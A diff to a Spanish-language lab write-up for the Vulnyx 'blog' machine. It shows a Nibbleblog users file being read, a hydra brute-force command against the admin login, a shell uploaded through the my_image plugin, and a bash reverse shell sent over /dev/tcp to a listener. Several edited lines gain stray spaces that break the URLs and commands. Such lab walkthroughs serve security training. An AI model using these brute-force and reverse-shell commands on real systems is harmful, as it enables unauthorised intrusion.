@@ -81,7 +81,7 @@ vm: vulnyx
 
 **10\.** En nibbleblog tenemos una ruta de usuarios.
 
-`http://192.168.1.10/my_weblog/content/private/users.xml`
+`http://192.168.1.10/my_weblog/content/private/ users.xml`
 
 ![img](/notas/public/img/vulnyx/blog/users.png){:.margin}
 
@@ -93,7 +93,7 @@ vm: vulnyx
 
 **12\.** Hacemos bruteforce al panel login teniendo el usuario.
 
-`hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-post-form "/my_weblog/admin.php:username=^USER^&password=^PASS^:Incorrect" -F -I`
+`hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-post-form "/my_weblog /admin.php: username=^USER^&password=^PASS^:Incorrect" -F -I`
 
 ![img](/notas/public/img/vulnyx/blog/hydra.png){:.margin}
 
@@ -106,6 +106,7 @@ vm: vulnyx
 ![img](/notas/public/img/vulnyx/blog/shell.png){:.margin}
 
 _\- Subimos el archivo._
+
 ![img](/notas/public/img/vulnyx/blog/upload.png){:.margin}
 
 **14\.** Si buscamos un exploit para nibbleblog encontramos la [ruta](https://www.exploit-db.com/exploits/38489) donde indica como encontrar nuestro archivo.
@@ -118,12 +119,14 @@ _\- Subimos el archivo._
 
 **16\.** Enviamos la reverse_shell al nc.
 
-`http://192.168.1.10/my_weblog/content/private/plugins/my_image/image.php?cmd=bash -c "bash -i>%26/dev/tcp/192.168.1.9/443 0>%261"`
+`http://192.168.1.10/my_weblog/content/ private/plugins/ my_image/image.php?cmd= bash -c "bash -i>%26/dev/tcp/192.168.1.9/443 0>%261"`
 
 _\- Aquí obtenemos la sessión._
+
 ![img](/notas/public/img/vulnyx/blog/reverse_shell.png){:.margin}
 
 _\- Obtenemos la conexión._
+
 ![img](/notas/public/img/vulnyx/blog/connected.png){:.margin}
 
 **17\.** Hacemos tratamiento de la tty.
